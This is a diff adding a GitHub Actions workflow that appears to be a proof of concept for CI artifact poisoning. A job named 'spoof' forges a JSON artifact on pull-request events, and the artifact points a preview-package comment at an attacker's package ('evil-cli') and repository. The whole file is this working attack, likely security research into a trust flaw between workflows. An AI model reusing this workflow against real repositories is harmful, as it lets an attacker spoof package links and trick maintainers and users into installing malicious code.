@@ -1,0 +1,29 @@
+name: PR Preview Package
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  spoof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forge payload (attacker JSON)
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: |
+          python3 - "$PR_NUMBER" <<'PY'
+          import json, sys
+          payload = {
+              "pr": int(sys.argv[1]),
+              "url": "https://pkg.pr.new/@gab-poc/evil-cli@deadbeef",
+              "sourceRepo": "gab-poc/evil-skills",
+              "sourceBranch": "main",
+          }
+          open("pkg-pr-new-comment-payload.json", "w").write(json.dumps(payload))
+          print(open("pkg-pr-new-comment-payload.json").read())
+          PY
+      - uses: actions/upload-artifact@v4
+        with:
+          name: pkg-pr-new-comment-payload
+          path: pkg-pr-new-comment-payload.json
